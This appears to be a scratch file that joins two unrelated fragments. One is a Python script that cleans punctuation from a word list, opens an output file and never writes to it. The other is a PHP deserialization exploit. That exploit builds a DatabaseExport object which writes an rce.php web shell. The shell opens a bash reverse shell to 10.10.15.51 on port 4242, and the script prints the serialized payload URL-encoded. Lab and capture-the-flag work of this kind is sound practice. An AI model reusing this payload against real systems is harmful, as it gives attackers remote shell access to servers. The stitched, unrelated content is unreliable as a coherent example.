def clean(string):
    bad_chars = "!@#$%^&*()_+><?|.,:;-\"\'"
    string = string.replace("\n","")
    string = list(string)
    for elem in range(len(string)):
        if string[elem] in bad_chars:
            string[elem] = ""
    string = "".join(string)
    return string.lower().capitalize()

out = open("out2.list", "a")
with open("out.list","r") as file:
    for line in file.readlines():
        if len(line) > 3:
            line = clean(line)
            # print(line)


class DatabaseExport {
  public $user_file = 'rce.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.15.51/4242 0>&1\'"); ?>';
  }

print urlencode(serialize(new DatabaseExport));